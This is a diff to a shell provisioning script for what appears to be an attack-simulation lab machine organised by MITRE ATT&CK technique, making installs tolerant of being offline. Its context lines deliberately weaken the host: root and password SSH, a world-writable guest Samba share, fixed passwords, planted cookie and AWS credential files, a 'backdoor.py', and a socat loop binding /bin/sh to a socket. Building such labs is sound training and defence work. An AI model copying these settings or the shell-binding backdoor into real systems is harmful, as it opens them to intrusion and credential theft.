@@ -3,11 +3,11 @@
 #
 ## Global commands
 #
-apt-get update
-apt-get install -y python3 python3-pip sshpass curl socat
+: # apt-get update (offline: pacotes ja instalados no build)
+apt-get install -y python3 python3-pip sshpass curl socat 2>/dev/null || true
 
 ## SSH
-apt-get install -y openssh-server
+apt-get install -y openssh-server 2>/dev/null || true
 mkdir -p /var/run/sshd
 echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
 echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config
@@ -40,7 +40,7 @@ printf 'cookie1=value1; cookie2=value2' > /home/attacker/.config/google-chrome/D
 chown -R attacker:attacker /home/attacker/.config
 
 # T1078.002
-apt-get install -y samba samba-common-bin
+apt-get install -y samba samba-common-bin 2>/dev/null || true
 printf '[global]\n   workgroup = WORKGROUP\n   server string = Samba Server\n   netbios name = debianA\n   security = user\n   map to guest = Bad User\n\n[share]\n   path = /srv/samba/share\n   browsable =yes\n   writable = yes\n   guest ok = yes\n   read only = no\n' > /etc/samba/smb.conf
 mkdir -p /srv/samba/share
 chmod -R 0777 /srv/samba/share
@@ -54,7 +54,7 @@ echo 'DebianUser:DebianUser' | chpasswd
 (echo 'DebianUser'; echo 'DebianUser') | smbpasswd -a -s DebianUser
 
 #T1090
-pip3 install --break-system-packages flask flask-cors requests
+pip3 install --break-system-packages flask flask-cors requests 2>/dev/null || true
 mkdir -p /home/attacker/malware
 cat > /home/attacker/malware/backdoor.py << 'EOF'
 #!/usr/bin/env python3
@@ -83,7 +83,7 @@ if ! ss -tuln | grep -q ":5055 "; then
 fi
 
 # T1559
-apt-get install -y socat
+apt-get install -y socat 2>/dev/null || true
 cat > /root/ipc_server.sh << 'EOF'
 #!/bin/sh
 while true; do socat UNIX-LISTEN:/tmp/mysocket,fork EXEC:/bin/sh; sleep 1; done &
@@ -109,11 +109,11 @@ echo "if I wanted"
 EOF
 
 # T1584.006
-apt-get install -y unzip
-pip install --break-system-packages boto3
-curl -fsSL https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip -o /tmp/awscliv2.zip
-unzip -o /tmp/awscliv2.zip -d /tmp
-/tmp/aws/install --update
+apt-get install -y unzip 2>/dev/null || true
+pip install --break-system-packages boto3 2>/dev/null || true
+curl -fsSL https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip -o /tmp/awscliv2.zip || true
+unzip -o /tmp/awscliv2.zip -d /tmp 2>/dev/null || true
+/tmp/aws/install --update 2>/dev/null || true
 mkdir -p /home/attacker/.aws
 cat <<EOF > /home/attacker/.aws/credentials
 [default]
